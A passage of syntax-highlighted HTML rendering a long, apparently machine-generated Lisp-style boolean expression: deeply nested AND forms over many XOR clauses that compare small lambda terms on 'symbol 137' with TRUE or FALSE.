class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> TRUE (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span 